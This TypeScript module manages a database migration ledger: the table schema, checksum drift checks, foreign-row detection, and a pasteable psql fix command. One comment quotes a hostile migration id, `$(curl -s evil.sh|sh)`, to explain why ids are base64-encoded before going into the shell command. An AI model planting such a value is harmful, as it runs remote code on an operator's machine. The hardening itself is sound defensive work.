// Single responsibility: the `x_migrations` ledger — what a migration IS, the table that records
// one applied, and the pure verdicts read off it (checksum drift, a foreign row, what is pending).
// Split from `migrate.ts`, which keeps the lock, the apply loop and the rollback; `migrate.ts`
// re-exports every name here, so its public surface is unchanged.

import type { DbClient } from './client';
import type { SchemaDescription } from './introspect';
import { migrationConflict } from './migration-errors';
import { migrationNameArg } from './primary-key';
import { raw, sql } from './sql';
import { SQLSTATE, sqlState } from './sqlstate';

export const LEDGER_TABLE = 'x_migrations';

export interface Migration {
  /** Sort key and primary key. `20260726120000_add_publish_at`. */
  readonly id: string;
  readonly name: string;
  readonly up: string;
  readonly down: string;
  /** Computed from `up` when absent. */
  readonly checksum?: string | undefined;
  /** The schema this migration leaves behind. `drift.ts` compares the live DB against it. */
  readonly snapshot?: SchemaDescription | undefined;
}

export interface LedgerRow {
  readonly id: string;
  readonly name: string;
  readonly checksum: string;
  readonly applied_at: string;
  readonly app_version: string;
  readonly duration_ms: number;
}

export function checksumOf(text: string): string {
  return new Bun.CryptoHasher('sha256').update(text.trim()).digest('hex').slice(0, 32);
}

export function migrationChecksum(migration: Migration): string {
  return migration.checksum ?? checksumOf(migration.up);
}

export async function ensureLedger(client: DbClient): Promise<void> {
  await client.execute(sql`
    create table if not exists ${raw(LEDGER_TABLE)} (
      id text primary key,
      name text not null,
      checksum text not null,
      applied_at timestamptz not null default now(),
      app_version text not null,
      duration_ms integer not null
    )
  `);
}

/**
 * Whether `error` is "the ledger table does not exist" and nothing else.
 *
 * Everything else — a permission denied, a server in recovery, a timeout — is a failure to read the
 * ledger, not an empty one, and a caller treating the two alike reports every migration as pending
 * against a database it cannot see.
 *
 * The SQLSTATE comes from `sqlState()` and from nowhere else: this function used to read
 * `sourceError.code` itself, which is the SQLSTATE on PGlite and the literal string
 * `ERR_POSTGRES_SERVER_ERROR` on `Bun.SQL`, so it answered `false` for a genuinely missing ledger
 * on every production driver. One reader, one answer (axiom 1).
 */
export function isLedgerMissing(error: unknown): boolean {
  return sqlState(error) === SQLSTATE.undefinedTable;
}

export async function readLedger(client: DbClient): Promise<readonly LedgerRow[]> {
  return client.query<LedgerRow>(sql`
    select id, name, checksum, applied_at, app_version, duration_ms
    from ${raw(LEDGER_TABLE)}
    order by id
  `);
}

/**
 * Every reason a migrator must stop before touching the schema. Pure, so `x db status` can
 * report the same verdict without holding the lock.
 */
export function auditLedger(
  ledger: readonly LedgerRow[],
  migrations: readonly Migration[],
  appVersion: string,
): void {
  const known = new Map(migrations.map((migration) => [migration.id, migration]));

  // The predicate is "this build does not ship it" and NOTHING else. It used to also require
  // `row.app_version !== appVersion`, which switched the audit off wherever the two agree —
  // `runningAppVersion()` answers `dev` for every development build, so a migration applied by an
  // earlier `dev` build and since deleted was invisible here, and `expectedSchema` then dropped
  // its table from the drift comparison: `ok: true` against a database that still has the table.
  // The version is a detail of the ANSWER, so it moved into the cause.
  const foreign = ledger.filter((row) => !known.has(row.id));
  const first = foreign[0];
  if (first !== undefined) {
    throw migrationConflict(
      `the ledger records migration "${first.id}" applied by app version "${first.app_version}" ` +
        `but this build is "${appVersion}" and does not ship it`,
      // `x db status` has never existed — the subcommands are gen, migrate, reset, studio, branch
      // and backfill — and this is one of the two errors most likely to fire during a real deploy.
      // A `fix:` is copied and run verbatim, so it names the ledger read that works anywhere psql
      // does, and the one edit that resolves the disagreement.
      conflictFix(first),
    );
  }

  for (const row of ledger) {
    const migration = known.get(row.id);
    if (migration === undefined) continue;
    const checksum = migrationChecksum(migration);
    if (checksum === row.checksum) continue;
    throw migrationConflict(
      `migration "${row.id}" was applied with checksum ${row.checksum} but now hashes ${checksum}`,
      `x db gen ${migrationNameArg(`fix ${migration.name}`)}   # never edit an applied migration, add a new one`,
    );
  }
}

/**
 * The migration id is the DATABASE's own text — whoever can write a ledger row picks what lands in
 * a line an operator pastes — and it goes inside SHELL DOUBLE QUOTES, where `$(…)` and a backtick
 * substitute before psql is reached at all. Measured before this screen: an id of
 * `$(curl -s evil.sh|sh)` produced exactly that command.
 *
 * So the id does not go in as text. It goes in **base64**, decoded by Postgres itself
 * (`convert_from(decode(…,'base64'),'UTF8')`), and the base64 alphabet is `A-Za-z0-9+/=` — every
 * character of it inert in shell double quotes and inert inside a SQL string literal. One command
 * shape for every ledger row there can be, with no screen, no branch and no escape to get wrong.
 *
 * It DID branch: `shellInertIdentifier` screened both the id and the app version, and a refusal
 * degraded the whole line to prose naming no command — so a row could take the one instruction
 * away from the operator by holding a space. An error that stops being an instruction under
 * adversarial input is an error the adversary silenced (axiom 4). The version is not in the line
 * at all any more; the CAUSE already names it, and the fix's job is to be runnable.
 *
 * The id is unreadable in the command, and that is the trade: `cause:` is where a human reads
 * which migration this is, `fix:` is where they paste. `psql` echoes the row count it deleted.
 */
function conflictFix(row: LedgerRow): string {
  const encodedId = Buffer.from(row.id, 'utf8').toString('base64');
  return (
    'deploy the app version this error names — or, if that build is gone, drop its row: ' +
    `psql "$DATABASE_URL" -c "delete from ${LEDGER_TABLE} ` +
    `where id = convert_from(decode('${encodedId}', 'base64'), 'UTF8')"`
  );
}

export function pendingMigrations(
  ledger: readonly LedgerRow[],
  migrations: readonly Migration[],
): readonly Migration[] {
  const applied = new Set(ledger.map((row) => row.id));
  return [...migrations]
    .sort((a, b) => (a.id < b.id ? -1 : 1))
    .filter((migration) => !applied.has(migration.id));
}
